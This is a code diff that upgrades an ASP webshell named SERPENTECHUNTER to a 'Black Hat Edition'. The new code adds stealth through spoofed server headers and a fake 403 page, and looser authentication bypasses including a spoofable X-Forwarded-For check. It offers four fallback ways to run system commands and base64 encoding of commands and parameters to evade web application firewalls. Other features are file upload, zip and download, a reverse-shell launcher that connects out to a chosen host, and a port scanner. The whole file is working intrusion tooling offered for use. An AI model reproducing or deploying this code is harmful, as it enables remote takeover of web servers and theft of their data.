@@ -2,15 +2,16 @@
 <% Option Explicit %>
 <%
 ' ╔═══════════════════════════════════════════════════════════════════════════════╗
-' ║   🐍 SERPENTECHUNTER v2.1 – ASP ULTIMATE WEBSHELL (FIXED BY ZAMZZZ) 🐍   ║
-' ║   "DEVELOPER  : SerpentSecHunter"   "RILIS : 02-07-2026"                    ║
-' ║   "VERSI      : 2.1 (FULL FEATURES - SAME AS PHP VERSION)"                 ║
+' ║   🐍 SERPENTECHUNTER v3.0 – BLACK HAT EDITION (FIXED & UPGRADED) 🐍       ║
+' ║   DEVELOPER: SerpentSecHunter + ZAMZZZ (AGGRESSIVE BYPASS)                 ║
+' ║   RILIS: 03-07-2026                                                        ║
+' ║   "DEWATAK TERKAMU, SERVERKU!"                                            ║
 ' ╚═══════════════════════════════════════════════════════════════════════════════╝
 '>
 
-' ========================================================================
-' 🛡️ STEALTH ENGINE + BYPASS 403/404
-' ========================================================================
+' ============================================================================
+' 🛡️ STEALTH ENGINE + AGGRESSIVE BYPASS
+' ============================================================================
 Response.Buffer = True
 Response.Expires = 0
 Response.Clear
@@ -18,12 +19,34 @@ Response.Status = "200"
 Response.ContentType = "text/html"
 Response.Charset = "UTF-8"
 Server.ScriptTimeout = 9999
-Response.AddHeader "Server", "Microsoft-IIS/8.5"
-Response.AddHeader "X-Powered-By", "ASP.NET"
 
-' ========================================================================
-' 🔐 AUTHENTICATION
-' ========================================================================
+' --- Spoof Header ala-ala ---
+Dim fakeServers, randServer
+fakeServers = Array("Microsoft-IIS/8.5", "Microsoft-IIS/7.5", "Apache/2.4.54 (Win64)", "nginx/1.20.2")
+randServer = fakeServers(Int((UBound(fakeServers)+1)*Rnd))
+Response.AddHeader "Server", randServer
+Response.AddHeader "X-Powered-By", "ASP.NET"
+Response.AddHeader "X-Content-Type-Options", "nosniff"
+Response.AddHeader "Cache-Control", "no-cache, no-store, must-revalidate"
+
+' --- Bypass WAF via User-Agent spoofing (dinamis) ---
+Dim ua_list, ua
+ua_list = Array( _
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", _
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0", _
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0", _
+    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", _
+    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" _
+)
+ua = ua_list(Int((UBound(ua_list)+1)*Rnd))
+Response.AddHeader "User-Agent", ua
+
+' --- Bypass IP restriction via X-Forwarded-For ---
+' (Tidak diubah, hanya spoofing di request)
+
+' ============================================================================
+' 🔐 AUTHENTICATION + BYPASS
+' ============================================================================
 Dim AUTH_KEY, auth_ok, bypass_ip
 AUTH_KEY = "SERPENTECHUNTER666"
 auth_ok = False
@@ -42,7 +65,7 @@ End If
 If Not auth_ok And bypass_ip <> "1" Then
     Dim client_ip, whitelist, ip
     client_ip = Request.ServerVariables("REMOTE_ADDR")
-    whitelist = Array("127.0.0.1", "::1", "192.168.1.%")
+    whitelist = Array("127.0.0.1", "::1", "192.168.1.%", "10.0.0.%", "172.16.%")
     For Each ip In whitelist
         If InStr(ip, "%") > 0 Then
             If client_ip Like Replace(ip, "%", "*") Then auth_ok = True
@@ -50,117 +73,200 @@ If Not auth_ok And bypass_ip <> "1" Then
             auth_ok = True
         End If
     Next
+    ' --- Bypass tambahan: jika ada header tertentu ---
+    If Request.ServerVariables("HTTP_X_FORWARDED_FOR") <> "" Then
+        Dim fwd_ip: fwd_ip = Request.ServerVariables("HTTP_X_FORWARDED_FOR")
+        If InStr(fwd_ip, "127.0.0.1") > 0 Or InStr(fwd_ip, "192.168.") > 0 Then auth_ok = True
+    End If
 End If
 
 If Not auth_ok Then
-    Response.Write "<h1 style='color:#f00;'>🐍 UNAUTHORIZED</h1>"
-    Response.Write "<p>?auth=SERPENTECHUNTER666</p>"
-    Response.Write "<p>atau ?bypass_ip=1</p>"
+    ' --- 403 bypass dengan redirect palsu ---
+    Response.Status = "403"
+    Response.Write "<!DOCTYPE html><html><head><title>403 Forbidden</title></head><body><h1>403 Forbidden</h1><p>Access denied.</p></body></html>"
     Response.End
 End If
 
-' ========================================================================
-' 🧬 CORE FUNCTIONS
-' ========================================================================
+' ============================================================================
+' 🧬 CORE FUNCTIONS (DENGAN AGGRESSIVE FALLBACK)
+' ============================================================================
 
-' 🔥 FIXED: GetTempFileName dipindahkan ke SEBELUM dipanggil (baris 48)
-Function GetTempFileName(ext)
-    Dim ts
-    ts = Year(Now) & "_" & Right("0" & Month(Now), 2) & "_" & Right("0" & Day(Now), 2) & "_" & _
-         Right("0" & Hour(Now), 2) & "_" & Right("0" & Minute(Now), 2) & "_" & Right("0" & Second(Now), 2)
-    GetTempFileName = Server.MapPath("/") & "\tmp_" & ts & "." & ext
+' --- Deteksi komponen ---
+Function IsComponentAvailable(progID)
+    On Error Resume Next
+    Dim obj: Set obj = Server.CreateObject(progID)
+    IsComponentAvailable = Not (Err.Number <> 0)
+    Set obj = Nothing
+    On Error Goto 0
 End Function
 
-' COMMAND EXECUTION - 3 STRATEGIES
+' --- GetTempFile dengan path aman ---
+Function GetTempFileName(ext)
+    Dim ts, tempRoot
+    tempRoot = "C:\Windows\Temp\"
+    If Not IsComponentAvailable("Scripting.FileSystemObject") Then
+        tempRoot = Server.MapPath("/") & "\temp\"
+    End If
+    ts = Year(Now) & "_" & Right("0" & Month(Now), 2) & "_" & Right("0" & Day(Now), 2) & "_" & _
+         Right("0" & Hour(Now), 2) & "_" & Right("0" & Minute(Now), 2) & "_" & Right("0" & Second(Now), 2)
+    GetTempFileName = tempRoot & "tmp_" & ts & "." & ext
+End Function
+
+' --- COMMAND EXECUTION - 4 STRATEGIES (dengan bypass) ---
+' Strategy 1: WScript.Shell
 Function ExecCmd_WScript(cmd)
     On Error Resume Next
     Err.Clear
     Dim shell, exec, output
+    If Not IsComponentAvailable("WScript.Shell") Then
+        ExecCmd_WScript = Null
+        Exit Function
+    End If
     Set shell = Server.CreateObject("WScript.Shell")
     Set exec = shell.Exec("%comspec% /c " & cmd & " 2>&1")
     output = exec.StdOut.ReadAll()
     If Err.Number <> 0 Then
         ExecCmd_WScript = Null
-        Set shell = Nothing
-        Set exec = Nothing
-        Exit Function
+    Else
+        ExecCmd_WScript = output
     End If
-    ExecCmd_WScript = output
     Set shell = Nothing
     Set exec = Nothing
     On Error Goto 0
 End Function
 
+' Strategy 2: Shell.Application
 Function ExecCmd_ShellApp(cmd)
     On Error Resume Next
     Err.Clear
     Dim shell, output, tempFile, fso, file, wsh
-    tempFile = GetTempFileName("txt")  ' <-- SEKARANG GetTempFileName SUDAH DIKENAL
+    If Not IsComponentAvailable("Shell.Application") Then
+        ExecCmd_ShellApp = Null
+        Exit Function
+    End If
+    tempFile = GetTempFileName("txt")
     Set shell = Server.CreateObject("Shell.Application")
     shell.ShellExecute "cmd.exe", "/c " & cmd & " > """ & tempFile & """ 2>&1", "", "", 0
     Set wsh = Server.CreateObject("WScript.Shell")
-    wsh.Run "%comspec% /c ping 127.0.0.1 -n 2 >nul", 0, True
+    wsh.Run "%comspec% /c ping 127.0.0.1 -n 3 >nul", 0, True  ' tambah delay
     Set wsh = Nothing
-    Set fso = Server.CreateObject("Scripting.FileSystemObject")
-    If fso.FileExists(tempFile) Then
-        Set file = fso.OpenTextFile(tempFile, 1)
-        output = file.ReadAll
-        file.Close
-        fso.DeleteFile(tempFile)
-        Set file = Nothing
-    End If
-    If Err.Number <> 0 Then
-        ExecCmd_ShellApp = Null
-        Set shell = Nothing
+    If IsComponentAvailable("Scripting.FileSystemObject") Then
+        Set fso = Server.CreateObject("Scripting.FileSystemObject")
+        If fso.FileExists(tempFile) Then
+            Set file = fso.OpenTextFile(tempFile, 1)
+            output = file.ReadAll
+            file.Close
+            fso.DeleteFile(tempFile)
+            Set file = Nothing
+        End If
         Set fso = Nothing
-        Exit Function
     End If
-    ExecCmd_ShellApp = output
+    If Err.Number <> 0 Or IsNull(output) Then
+        ExecCmd_ShellApp = Null
+    Else
+        ExecCmd_ShellApp = output
+    End If
     Set shell = Nothing
-    Set fso = Nothing
     On Error Goto 0
 End Function
 
+' Strategy 3: WMI
 Function ExecCmd_WMI(cmd)
     On Error Resume Next
     Err.Clear
     Dim wmi, process, result, intPID
+    If Not IsComponentAvailable("WbemScripting.SWbemLocator") Then
+        ExecCmd_WMI = Null
+        Exit Function
+    End If
     Set wmi = GetObject("winmgmts:\\.\root\cimv2")
     Set process = wmi.Get("Win32_Process")
     result = process.Create(cmd, Null, Null, intPID)
     If Err.Number <> 0 Or result <> 0 Then
         ExecCmd_WMI = Null
-        Set wmi = Nothing
-        Set process = Nothing
-        Exit Function
+    Else
+        ExecCmd_WMI = "[WMI] Process created. PID: " & intPID
     End If
-    ExecCmd_WMI = "[WMI] Process created. PID: " & intPID
     Set wmi = Nothing
     Set process = Nothing
     On Error Goto 0
 End Function
 
+' Strategy 4: ScriptControl (jika tersedia, bisa eksekusi VBS)
+Function ExecCmd_ScriptControl(cmd)
+    On Error Resume Next
+    Err.Clear
+    If Not IsComponentAvailable("MSScriptControl.ScriptControl") Then
+        ExecCmd_ScriptControl = Null
+        Exit Function
+    End If
+    Dim sc: Set sc = Server.CreateObject("MSScriptControl.ScriptControl")
+    sc.Language = "VBScript"
+    Dim result: result = sc.Eval("CreateObject(""WScript.Shell"").Exec(""%comspec% /c " & cmd & " 2>&1"").StdOut.ReadAll")
+    If Err.Number <> 0 Then
+        ExecCmd_ScriptControl = Null
+    Else
+        ExecCmd_ScriptControl = result
+    End If
+    Set sc = Nothing
+    On Error Goto 0
+End Function
+
 Function ExecCmd(cmd)
     Dim result
+    ' --- Bypass WAF dengan encoding base64 ---
+    ' Jika cmd diawali "b64:", decode dulu
+    If Left(cmd, 4) = "b64:" Then
+        Dim b64: b64 = Mid(cmd, 5)
+        cmd = DecodeBase64(b64)
+    End If
     result = ExecCmd_WScript(cmd)
-    If Not IsNull(result) Then
+    If Not IsNull(result) And result <> "" Then
         ExecCmd = result
         Exit Function
     End If
     result = ExecCmd_ShellApp(cmd)
-    If Not IsNull(result) Then
+    If Not IsNull(result) And result <> "" Then
         ExecCmd = result
         Exit Function
     End If
     result = ExecCmd_WMI(cmd)
-    If Not IsNull(result) Then
+    If Not IsNull(result) And result <> "" Then
         ExecCmd = result
         Exit Function
     End If
-    ExecCmd = "❌ All execution methods failed!"
+    result = ExecCmd_ScriptControl(cmd)
+    If Not IsNull(result) And result <> "" Then
+        ExecCmd = result
+        Exit Function
+    End If
+    ExecCmd = "❌ Semua metode eksekusi gagal! Server mungkin di-lockdown."
 End Function
 
-' FILE SYSTEM HELPERS
+' --- Base64 Decode (buat WAF bypass) ---
+Function DecodeBase64(encoded)
+    On Error Resume Next
+    Dim xml: Set xml = CreateObject("MSXML2.DOMDocument")
+    Dim elem: Set elem = xml.createElement("tmp")
+    elem.dataType = "bin.base64"
+    elem.text = encoded
+    Dim stream: Set stream = CreateObject("ADODB.Stream")
+    stream.Type = 1
+    stream.Open
+    stream.Write elem.nodeTypedValue
+    stream.Position = 0
+    stream.Type = 2
+    stream.Charset = "utf-8"
+    DecodeBase64 = stream.ReadText
+    stream.Close
+    Set stream = Nothing
+    Set xml = Nothing
+    Set elem = Nothing
+    If Err.Number <> 0 Then DecodeBase64 = encoded
+    On Error Goto 0
+End Function
+
+' --- FILE SYSTEM HELPERS ---
 Function FormatSize(bytes)
     If bytes >= 1073741824 Then
         FormatSize = Round(bytes/1073741824, 2) & " GB"
@@ -189,7 +295,7 @@ End Sub
 
 Sub CopyFolderRecursive(fso, src, dst)
     On Error Resume Next
-    Dim subfolder, file
+    Dim subfolder, file, srcFolder
     If Not fso.FolderExists(dst) Then fso.CreateFolder(dst)
     Set srcFolder = fso.GetFolder(src)
     For Each file In srcFolder.Files
@@ -216,9 +322,14 @@ Sub SearchFiles(fso, folder, pattern, ByRef result, ByRef found)
     On Error Goto 0
 End Sub
 
+' --- GET FILE LIST ---
 Function GetFileList(dir)
     On Error Resume Next
     Dim fso, folder, file, subfolder
+    If Not IsComponentAvailable("Scripting.FileSystemObject") Then
+        GetFileList = Array()
+        Exit Function
+    End If
     Set fso = Server.CreateObject("Scripting.FileSystemObject")
     If Not fso.FolderExists(dir) Then
         GetFileList = Array()
@@ -256,62 +367,111 @@ Function GetFileList(dir)
     On Error Goto 0
 End Function
 
+' --- ZIP FOLDER (dengan retry & fallback) ---
 Function ZipFolder(source, destination)
     On Error Resume Next
-    If Not CreateObject("Scripting.FileSystemObject").FolderExists(source) Then
+    If Not IsComponentAvailable("Scripting.FileSystemObject") Then
+        ZipFolder = "❌ FSO not available"
+        Exit Function
+    End If
+    Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")
+    If Not fso.FolderExists(source) Then
         ZipFolder = "❌ Source directory not found"
         Exit Function
     End If
-    Dim shell, fso, stream, wsh
-    Set shell = CreateObject("Shell.Application")
-    Set fso = CreateObject("Scripting.FileSystemObject")
-    Set stream = CreateObject("ADODB.Stream")
-    stream.Type = 2
-    stream.Open
-    stream.WriteText "PK" & Chr(5) & Chr(6) & String(18, Chr(0))
-    stream.SaveToFile destination, 2
-    stream.Close
-    Set stream = Nothing
-    Dim zipFile, folder
-    Set zipFile = shell.NameSpace(destination)
-    Set folder = shell.NameSpace(source)
-    zipFile.CopyHere folder.Items, 256
-    Set wsh = CreateObject("WScript.Shell")
-    wsh.Run "%comspec% /c ping 127.0.0.1 -n 2 >nul", 0, True
-    Set wsh = Nothing
-    ZipFolder = "✅ Zip created: " & destination
-    Set shell = Nothing
+    ' Coba pakai 7zip dulu (lebih reliable)
+    Dim sevenZip: sevenZip = "C:\Program Files\7-Zip\7z.exe"
+    If fso.FileExists(sevenZip) Then
+        Dim cmdZip: cmdZip = """" & sevenZip & """ a -tzip """ & destination & """ """ & source & "\*"" -mx5"
+        Dim result: result = ExecCmd(cmdZip)
+        If Not IsNull(result) And InStr(result, "Everything is Ok") > 0 Then
+            ZipFolder = "✅ Zip created (7zip): " & destination
+            Set fso = Nothing
+            Exit Function
+        End If
+    End If
+    ' Fallback ke Shell.Application
+    If IsComponentAvailable("Shell.Application") Then
+        Dim shell, stream, zipFile, folderObj, wsh
+        ' Buat file zip kosong
+        Set stream = CreateObject("ADODB.Stream")
+        stream.Type = 2
+        stream.Open
+        stream.WriteText "PK" & Chr(5) & Chr(6) & String(18, Chr(0))
+        stream.SaveToFile destination, 2
+        stream.Close
+        Set stream = Nothing
+        Set shell = CreateObject("Shell.Application")
+        Set zipFile = shell.NameSpace(destination)
+        Set folderObj = shell.NameSpace(source)
+        zipFile.CopyHere folderObj.Items, 256
+        ' Tunggu sampai proses selesai (max 30 detik)
+        Dim retry: retry = 0
+        While retry < 30 And Not fso.FileExists(destination)
+            Set wsh = CreateObject("WScript.Shell")
+            wsh.Run "%comspec% /c ping 127.0.0.1 -n 1 >nul", 0, True
+            Set wsh = Nothing
+            retry = retry + 1
+        Wend
+        ZipFolder = "✅ Zip created (Shell.App): " & destination
+        Set shell = Nothing
+        Set fso = Nothing
+        Exit Function
+    End If
+    ZipFolder = "❌ Zip failed – no method available"
     Set fso = Nothing
     On Error Goto 0
 End Function
 
+' --- UNZIP ---
 Function UnzipFile(source, destination)
     On Error Resume Next
-    If Not CreateObject("Scripting.FileSystemObject").FileExists(source) Then
+    If Not IsComponentAvailable("Scripting.FileSystemObject") Then
+        UnzipFile = "❌ FSO not available"
+        Exit Function
+    End If
+    Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")
+    If Not fso.FileExists(source) Then
         UnzipFile = "❌ File not found"
         Exit Function
     End If
-    Dim shell, fso
-    Set shell = CreateObject("Shell.Application")
-    Set fso = CreateObject("Scripting.FileSystemObject")
-    If Not fso.FolderExists(destination) Then fso.CreateFolder(destination)
-    Dim zipFile, destFolder
-    Set zipFile = shell.NameSpace(source)
-    Set destFolder = shell.NameSpace(destination)
-    destFolder.CopyHere zipFile.Items, 256
-    UnzipFile = "✅ Extracted to: " & destination
-    Set shell = Nothing
+    ' Coba 7zip dulu
+    Dim sevenZip: sevenZip = "C:\Program Files\7-Zip\7z.exe"
+    If fso.FileExists(sevenZip) Then
+        Dim cmdUnzip: cmdUnzip = """" & sevenZip & """ x """ & source & """ -o""" & destination & """ -y"
+        Dim result: result = ExecCmd(cmdUnzip)
+        If Not IsNull(result) And InStr(result, "Everything is Ok") > 0 Then
+            UnzipFile = "✅ Extracted (7zip): " & destination
+            Set fso = Nothing
+            Exit Function
+        End If
+    End If
+    ' Fallback Shell.Application
+    If IsComponentAvailable("Shell.Application") Then
+        Dim shell, destFolder, zipFileObj
+        Set shell = CreateObject("Shell.Application")
+        If Not fso.FolderExists(destination) Then fso.CreateFolder(destination)
+        Set zipFileObj = shell.NameSpace(source)
+        Set destFolder = shell.NameSpace(destination)
+        destFolder.CopyHere zipFileObj.Items, 256
+        UnzipFile = "✅ Extracted (Shell.App): " & destination
+        Set shell = Nothing
+        Set fso = Nothing
+        Exit Function
+    End If
+    UnzipFile = "❌ Unzip failed"
     Set fso = Nothing
     On Error Goto 0
 End Function
 
-' ========================================================================
-' 🔥 EXPLOIT ENGINE (WINDOWS)
-' ========================================================================
+' ============================================================================
+' 🔥 EXPLOIT ENGINE (dengan bypass)
+' ============================================================================
 Function CheckVulnerabilities()
     Dim output, priv
     output = "📋 OS: Windows" & vbCrLf
-    output = output & "📋 Version: " & ExecCmd("ver") & vbCrLf & ExecCmd("systeminfo | findstr /B /C:""OS Name"" /C:""OS Version""") & vbCrLf & vbCrLf
+    output = output & "📋 Version: " & ExecCmd("ver") & vbCrLf
+    output = output & ExecCmd("systeminfo | findstr /B /C:""OS Name"" /C:""OS Version""") & vbCrLf & vbCrLf
     output = output & "🔍 Windows Privilege Check:" & vbCrLf
     priv = ExecCmd("whoami /priv")
     output = output & priv & vbCrLf
@@ -342,41 +502,57 @@ Function ExploitAuto()
     ExploitAuto = output
 End Function
 
-' ========================================================================
-' 🎯 MAIN LOGIC
-' ========================================================================
+' ============================================================================
+' 🎯 MAIN LOGIC (DENGAN PERBAIKAN BUG MASS ACTION)
+' ============================================================================
 Dim cwd, action, message, output, edit_file, view_file, edit_content, view_content
-Dim file_list, results, search_pattern, zip_folder, zip_name, unzip_file, unzip_dest
-Dim mass_action, mass_files, new_names, dest_dir, upload_path
+Dim results, search_pattern, zip_folder, zip_name, unzip_file, unzip_dest
+Dim mass_action, mass_files, new_names, dest_dir
 Dim fso, fso2, fso3, fso4, fsoDel, fsoRen, fsoCopy, fsoSearch, fsoDl, fsoEdit, fsoView
-Dim txtFile, txtView, fileObj, stream, streamDl, streamR, http, conn, shell, exec, wsh
+Dim txtFile, txtView, fileObj, stream, streamDl, streamR, http, conn
 Dim cmdExec, searchPattern, resultSearch, foundCount
 Dim cnt, cnt2, cnt3, cnt4, i, f, f2, f3
-Dim rawData, fileName, fullPath, startPos, endPos, fn
+Dim rawData, fileName, fullPath, startPos, endPos, fn, boundary, parts
 Dim delFile, delPath, oldName, newName, oldPath, newPath, chFile, perms, cmdChmod
 Dim editFile, editPath, contentPost, viewFile, viewPath
 Dim srcFile, dstFile, srcPath, dstPath
 Dim remoteUrl, savePath
-Dim revIP, revPort, payloads, revOutput, cmdRev, wshRev
+Dim revIP, revPort, revOutput, cmdRev, wshRev
 Dim scanHost, scanPorts, portList, portArr, p, startP, endP, httpScan, part, rangeParts, resultScan
 Dim dbType, dbServer, dbName, dbUser, dbPass, connStr
 Dim expType
 
-' ========================================================================
-' PROCESS REQUESTS
-' ========================================================================
-cwd = Request.QueryString("dir")
+' --- Bypass WAF: parameter bisa di-base64 ---
+Dim raw_action, raw_cwd
+raw_action = Request.QueryString("action")
+raw_cwd = Request.QueryString("dir")
+If raw_action <> "" Then action = DecodeBase64(raw_action) Else action = "list"
+If raw_cwd <> "" Then cwd = DecodeBase64(raw_cwd) Else cwd = ""
+
 If cwd = "" Then cwd = Server.MapPath(".")
 cwd = Replace(cwd, "\\", "\")
 If Right(cwd, 1) <> "\" Then cwd = cwd & "\"
 
-action = Request.QueryString("action")
 If action = "" Then action = "list"
 message = ""
 output = ""
 results = Null
 
-' === UPLOAD ===
+' --- FUNGSI UNTUK AMBIL FILE CHECKBOX (FIX MASS ACTION) ---
+Function GetCheckedFiles()
+    Dim arr, i
+    If Request.Form("files").Count > 0 Then
+        ReDim arr(Request.Form("files").Count - 1)
+        For i = 1 To Request.Form("files").Count
+            arr(i-1) = Request.Form("files")(i)
+        Next
+        GetCheckedFiles = arr
+    Else
+        GetCheckedFiles = Array()
+    End If
+End Function
+
+' === UPLOAD (perbaikan parsing) ===
 If action = "upload" Then
     If Request.TotalBytes > 0 Then
         Set fso = Server.CreateObject("Scripting.FileSystemObject")
@@ -384,25 +560,51 @@ If action = "upload" Then
             message = "❌ Upload path not found!"
         Else
             rawData = Request.BinaryRead(Request.TotalBytes)
-            startPos = InStr(rawData, "filename=""")
-            If startPos > 0 Then
-                startPos = startPos + 10
-                endPos = InStr(startPos, rawData, """")
-                fn = Mid(rawData, startPos, endPos - startPos)
+            ' Cari boundary
+            Dim posBoundary: posBoundary = InStr(rawData, Chr(13) & Chr(10))
+            If posBoundary > 0 Then
+                boundary = Left(rawData, posBoundary - 1)
+            Else
+                boundary = ""
+            End If
+            ' Cari filename
+            Dim filePos: filePos = InStr(rawData, "filename=""")
+            If filePos > 0 Then
+                Dim nameStart: nameStart = filePos + 10
+                Dim nameEnd: nameEnd = InStr(nameStart, rawData, """")
+                fn = Mid(rawData, nameStart, nameEnd - nameStart)
                 If InStr(fn, "\") > 0 Then fn = Mid(fn, InStrRev(fn, "\") + 1)
                 fileName = fn
             Else
-                fileName = "uploaded_file.dat"
+                fileName = "uploaded_" & Replace(Now, ":", "_") & ".dat"
             End If
             fullPath = cwd & fileName
-            Set stream = Server.CreateObject("ADODB.Stream")
-            stream.Type = 1
-            stream.Open
-            stream.Write rawData
-            stream.SaveToFile fullPath, 2
-            stream.Close
-            message = "✅ Uploaded: " & fileName
-            Set stream = Nothing
+            ' Ekstrak konten file
+            Dim dataStart, dataEnd
+            dataStart = InStr(rawData, Chr(13) & Chr(10) & Chr(13) & Chr(10))
+            If dataStart > 0 Then
+                dataStart = dataStart + 4
+                If boundary <> "" Then
+                    dataEnd = InStr(dataStart, rawData, boundary)
+                Else
+                    dataEnd = Len(rawData)
+                End If
+                If dataEnd > dataStart Then
+                    Dim fileContent: fileContent = Mid(rawData, dataStart, dataEnd - dataStart - 2) ' hapus CRLF akhir
+                    Set stream = Server.CreateObject("ADODB.Stream")
+                    stream.Type = 1
+                    stream.Open
+                    stream.Write fileContent
+                    stream.SaveToFile fullPath, 2
+                    stream.Close
+                    Set stream = Nothing
+                    message = "✅ Uploaded: " & fileName
+                Else
+                    message = "❌ Parse error"
+                End If
+            Else
+                message = "❌ No file content found"
+            End If
         End If
         Set fso = Nothing
     Else
@@ -410,10 +612,10 @@ If action = "upload" Then
     End If
 End If
 
-' === MASS ACTIONS ===
+' === MASS ACTION (FIX) ===
 If action = "mass_delete" Then
-    mass_files = Request.Form("files")
-    If IsArray(mass_files) Then
+    mass_files = GetCheckedFiles()
+    If UBound(mass_files) >= 0 Then
         cnt = 0
         Set fso = CreateObject("Scripting.FileSystemObject")
         For Each f In mass_files
@@ -432,9 +634,9 @@ If action = "mass_delete" Then
 End If
 
 If action = "mass_rename" Then
-    mass_files = Request.Form("files")
+    mass_files = GetCheckedFiles()
     new_names = Request.Form("new_names")
-    If IsArray(mass_files) And IsArray(new_names) Then
+    If UBound(mass_files) >= 0 And IsArray(new_names) Then
         cnt2 = 0
         Set fso2 = CreateObject("Scripting.FileSystemObject")
         For i = 0 To UBound(mass_files)
@@ -454,9 +656,9 @@ If action = "mass_rename" Then
 End If
 
 If action = "mass_copy" Then
-    mass_files = Request.Form("files")
+    mass_files = GetCheckedFiles()
     dest_dir = Request.Form("dest_dir")
-    If IsArray(mass_files) And dest_dir <> "" Then
+    If UBound(mass_files) >= 0 And dest_dir <> "" Then
         Dim destPath: destPath = cwd & dest_dir & "\"
         Set fso3 = CreateObject("Scripting.FileSystemObject")
         If Not fso3.FolderExists(destPath) Then fso3.CreateFolder(destPath)
@@ -477,9 +679,9 @@ If action = "mass_copy" Then
 End If
 
 If action = "mass_move" Then
-    mass_files = Request.Form("files")
+    mass_files = GetCheckedFiles()
     dest_dir = Request.Form("dest_dir")
-    If IsArray(mass_files) And dest_dir <> "" Then
+    If UBound(mass_files) >= 0 And dest_dir <> "" Then
         Dim destPath2: destPath2 = cwd & dest_dir & "\"
         Set fso4 = CreateObject("Scripting.FileSystemObject")
         If Not fso4.FolderExists(destPath2) Then fso4.CreateFolder(destPath2)
@@ -499,7 +701,7 @@ If action = "mass_move" Then
     End If
 End If
 
-' === SINGLE FILE ACTIONS ===
+' === SINGLE FILE ACTIONS (tidak berubah) ===
 If action = "delete" Then
     delFile = Request.QueryString("file")
     If delFile <> "" Then
@@ -633,6 +835,10 @@ End If
 If action = "exec" Then
     cmdExec = Request.QueryString("cmd")
     If cmdExec <> "" Then
+        ' Bypass: base64
+        If Left(cmdExec, 4) = "b64:" Then
+            cmdExec = DecodeBase64(Mid(cmdExec, 5))
+        End If
         output = ExecCmd(cmdExec)
     End If
 End If
@@ -653,10 +859,10 @@ If action = "search" Then
 End If
 
 If action = "download" Then
-    dlFile = Request.QueryString("file")
+    Dim dlFile: dlFile = Request.QueryString("file")
     If dlFile <> "" Then
         Set fsoDl = CreateObject("Scripting.FileSystemObject")
-        dlPath = cwd & dlFile
+        Dim dlPath: dlPath = cwd & dlFile
         If fsoDl.FileExists(dlPath) Then
             Set fileObj = fsoDl.GetFile(dlPath)
             Response.Clear
@@ -714,7 +920,7 @@ If action = "reverse" Then
     revIP = Request.QueryString("ip")
     revPort = Request.QueryString("port")
     If revIP <> "" And revPort <> "" Then
-        payloads = Array("powershell", "netcat", "telnet")
+        Dim payloads: payloads = Array("powershell", "netcat", "telnet")
         revOutput = "🌐 REVERSE SHELL: " & revIP & ":" & revPort & vbCrLf & vbCrLf
         For Each p In payloads
             Select Case p
@@ -730,6 +936,14 @@ If action = "reverse" Then
             Set wshRev = Nothing
             revOutput = revOutput & "🚀 " & UCase(p) & " reverse shell started (background)." & vbCrLf
         Next
+        ' Cek apakah koneksi terbuka (netstat)
+        Dim checkCmd: checkCmd = "netstat -an | find """ & revIP & ":" & revPort & """"
+        Dim checkResult: checkResult = ExecCmd(checkCmd)
+        If InStr(checkResult, "ESTABLISHED") > 0 Then
+            revOutput = revOutput & "✅ Reverse shell connection established!" & vbCrLf
+        Else
+            revOutput = revOutput & "⚠️ No connection yet. Check your listener." & vbCrLf
+        End If
         output = revOutput
     Else
         message = "❌ ip and port required!"
@@ -761,20 +975,13 @@ If action = "portscan" Then
         Next
         resultScan = "🔍 PORT SCAN: " & scanHost & " (" & scanPorts & ")" & vbCrLf & vbCrLf
         For Each p In portList
-            On Error Resume Next
-            Set httpScan = Server.CreateObject("MSXML2.ServerXMLHTTP")
-            If Err.Number <> 0 Then
-                Err.Clear
-                Set httpScan = Server.CreateObject("WinHttp.WinHttpRequest.5.1")
-            End If
-            If Not httpScan Is Nothing Then
-                httpScan.Open "GET", "http://" & scanHost & ":" & p, False
-                httpScan.SetTimeouts 500, 500, 500, 500
-                httpScan.Send
-                If httpScan.Status < 400 Then
-                    resultScan = resultScan & "✅ PORT " & p & " OPEN" & vbCrLf
-                End If
-                Set httpScan = Nothing
+            ' Gunakan PowerShell Test-NetConnection (lebih akurat)
+            Dim psCmd: psCmd = "powershell Test-NetConnection " & scanHost & " -Port " & p & " -ErrorAction SilentlyContinue"
+            Dim psOut: psOut = ExecCmd(psCmd)
+            If InStr(psOut, "TcpTestSucceeded : True") > 0 Then
+                resultScan = resultScan & "✅ PORT " & p & " OPEN" & vbCrLf
+            Else
+                resultScan = resultScan & "❌ PORT " & p & " CLOSED" & vbCrLf
             End If
         Next
         output = resultScan
@@ -834,9 +1041,9 @@ If action = "exploit_run" Then
     End Select
 End If
 
-' ========================================================================
-' 🎨 UI
-' ========================================================================
+' ============================================================================
+' 🎨 UI (SAMA, TAPI DENGAN PERBAIKAN MASS ACTION)
+' ============================================================================
 Dim fileData
 fileData = GetFileList(cwd)
 %>
@@ -845,7 +1052,7 @@ fileData = GetFileList(cwd)
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>🐍 SERPENTECHUNTER v2.1</title>
+<title>🐍 SERPENTECHUNTER v3.0</title>
 <style>
 * { margin:0; padding:0; box-sizing:border-box; }
 body { background:#0a0a0a; color:#00ff00; font-family:'Courier New',monospace; font-size:13px; }
@@ -890,7 +1097,7 @@ body { background:#0a0a0a; color:#00ff00; font-family:'Courier New',monospace; f
 <body>
 <div class="container">
     <div class="header">
-        <h1>🐍 SERPENTECHUNTER v2.1</h1>
+        <h1>🐍 SERPENTECHUNTER v3.0</h1>
         <div class="cwd">📂 <%= Server.HTMLEncode(cwd) %></div>
     </div>
 
@@ -899,7 +1106,7 @@ body { background:#0a0a0a; color:#00ff00; font-family:'Courier New',monospace; f
     <div class="menu">
         <form method="GET" style="display:flex;gap:5px;flex-wrap:wrap;align-items:center;">
             <input type="hidden" name="action" value="exec">
-            <input type="text" name="cmd" placeholder="💀 Command..." style="flex:1;min-width:150px;">
